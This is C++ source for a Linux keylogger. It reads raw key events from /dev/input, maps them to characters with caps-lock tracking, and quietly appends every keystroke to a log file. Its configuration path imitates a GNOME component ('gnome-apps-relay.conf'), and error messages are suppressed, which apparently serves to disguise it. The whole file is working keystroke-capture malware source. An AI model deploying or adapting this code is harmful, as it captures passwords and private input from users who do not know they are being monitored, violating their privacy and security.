#include <fstream>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <unistd.h>
#include <linux/input.h>

#include "parse.h"


#define PATH_TO_CONFIG "/eetc/gnome-apps-relay.conf"
#define STANDARD_OUTPUTPATH "test.txt"	
#define STANDARD_KEYBOARD_EVENT_HOOK "/dev/input/by-id/../event0"


#define BOOT_FAILURE 1


#define DEBUG false 

struct KeyboardEvent{
	struct timeval time;
	int16_t type;
	int16_t code;
	unsigned int value;
};

struct LoggerMetaData{
	std::string pathToConfig = PATH_TO_CONFIG;
	std::string pathToOutput = STANDARD_OUTPUTPATH;
	std::string keyboardHookPath = STANDARD_KEYBOARD_EVENT_HOOK;
};


static void setLoggerOptions(struct LoggerMetaData*, std::ifstream&);	/*@brief Sets the LoggerMetaData with the values from the configfile*/
const std::string convertToUpper(std::string);
const std::string convertToLower(std::string);

int main(){
	struct LoggerMetaData loggerMetaData;

	std::ifstream configFileHandler;
	configFileHandler.open(loggerMetaData.pathToConfig, std::ifstream::in);

	if(!configFileHandler){	//If the logger was not able to open the config-file without any error, then the application uses the initialized meta information
		if(DEBUG){
			fprintf(stderr, "<klogger>: Was not able to open the configuration file");
		}
	}else{
		setLoggerOptions(&loggerMetaData, configFileHandler);
		configFileHandler.close();
	}

	int keyboardEventHook = open(loggerMetaData.keyboardHookPath.c_str(), O_RDONLY);
	if(keyboardEventHook == -1){
		if(DEBUG){
			fprintf(stderr, "<klogger>: Was not able to open KeyboardHook");
		}
		exit(EXIT_FAILURE);
	}
	createKeyMap();

	bool capsLock = false;
	int lastKey = 0;

	std::string mappedKey; 
	while(1){

		std::ofstream logFile;
		logFile.open(loggerMetaData.pathToOutput, std::ios::app);

		struct KeyboardEvent keyboardEvent;
		int readKeyboardHook = read(keyboardEventHook, &keyboardEvent, sizeof(struct KeyboardEvent));

		if(readKeyboardHook <= 0)
			continue;

		if(keyboardEvent.value != 1)
			continue;
		else 
			lastKey = keyboardEvent.code;

		mappedKey = keymap[lastKey];		
	

		if(mappedKey.find("[CAPS LOCK]") != std::string::npos){
			capsLock = !capsLock;
		}

		if(mappedKey.find("[") == std::string::npos){
			if(capsLock){
				mappedKey = convertToUpper(mappedKey);
			}else{
				mappedKey = convertToLower(mappedKey);
			}
		}

		logFile << mappedKey;
		logFile.flush();	
		logFile.close();
	}
	return 0;
}

static void setLoggerOptions(struct LoggerMetaData* loggerMetaData, std::ifstream& configFile){
	while(!configFile.eof()){
		std::string configLine;
		std::getline(configFile, configLine);
		if(configLine.length() > 0 && configLine.at(0) != '#'){
			if(configLine.at(0) == 'k'){		//Set Keyboard Hook-Location
				loggerMetaData->keyboardHookPath = configLine.substr(2, configLine.length() - 2);
			}else if(configLine.at(0) == 'f'){	//Set Loggfile-Location
				loggerMetaData->pathToOutput = configLine.substr(2, configLine.length() - 2);
			}
		}
	}
}

const std::string convertToUpper(std::string text){
	std::string upperString = "";
	for(char c : text){
		upperString += toupper(c);
	}
	upperString += '\0';
	return upperString;
}

const std::string convertToLower(std::string text){
	std::string lowerString = "";
	for(char c : text){
		lowerString += tolower(c);
	}
	lowerString += '\0';
	return lowerString;
}